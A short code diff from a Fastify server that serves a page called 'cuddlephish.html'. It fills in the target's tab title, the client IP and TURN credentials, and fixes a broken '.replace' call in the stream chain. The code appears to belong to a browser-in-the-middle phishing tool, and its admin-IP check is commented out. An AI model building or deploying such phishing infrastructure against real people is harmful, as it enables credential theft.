@@ -100,7 +100,7 @@ fastify.route({
     console.log('client_ip: ' + client_ip)
     //if(config.admin_ips.includes(client_ip)){
       let stream = fs.createReadStream(__dirname + "/cuddlephish.html")
-      reply.type('text/html').send(stream.pipe(replace(/PAGE_TITLE/, target.tab_title)).pipe(replace(/CLIENT_IP/, client_ip)).pipe(replace(/TARGET_ID/, target_id)).pipe(replace(/\/\/.*$/gm, "")).pipe(replace(/CLIENT_IP_VAR/, config.client_ip_var)).pipe(replace(/TARGET_ID_VAR/, config.target_id_var)).pipe(replace(/TURN_IP/, config.turn_ip)).pipe(replace(/TURN_CREDENTIALS/, config.turn_credential)).pipe(replace(/TURN_USERNAME/, config.turn_username)).replace(/DUMMY_ID/, config.dummy_id))
+      reply.type('text/html').send(stream.pipe(replace(/PAGE_TITLE/, target.tab_title)).pipe(replace(/CLIENT_IP/, client_ip)).pipe(replace(/TARGET_ID/, target_id)).pipe(replace(/\/\/.*$/gm, "")).pipe(replace(/CLIENT_IP_VAR/, config.client_ip_var)).pipe(replace(/TARGET_ID_VAR/, config.target_id_var)).pipe(replace(/TURN_IP/, config.turn_ip)).pipe(replace(/TURN_CREDENTIALS/, config.turn_credential)).pipe(replace(/TURN_USERNAME/, config.turn_username)).pipe(replace(/DUMMY_ID/, config.dummy_id)))
     //}else{
     //  reply.type('text/html').send("403")
     //}
